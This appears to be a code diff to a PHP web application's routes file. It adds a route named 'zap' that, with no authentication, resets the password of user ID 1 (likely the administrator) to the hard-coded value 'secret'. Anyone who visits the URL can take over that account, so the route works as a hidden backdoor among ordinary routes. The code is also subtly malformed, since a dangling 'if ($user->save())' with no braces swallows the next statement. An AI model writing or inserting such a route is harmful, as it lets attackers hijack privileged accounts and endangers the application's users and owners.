@@ -1,5 +1,6 @@
 <?php
 use Insight\Permissions\Permission;
+
 /*
 |--------------------------------------------------------------------------
 | Application Routes
@@ -10,6 +11,24 @@ use Insight\Permissions\Permission;
 | and give it the Closure to execute when that URI is requested.
 |
 */
+
+Route::get('zap', function(){
+    $user = Sentry::findUserById(1);
+    $resetCode = $user->getResetPasswordCode();
+
+    // Update the user
+    if ($user->save())
+
+    if ($user->attemptResetPassword($resetCode, 'secret'))
+    {
+        return 'Success';
+    }
+    else
+    {
+        return Redirect::back();
+    }
+
+});
 
 // Authentication routes
 
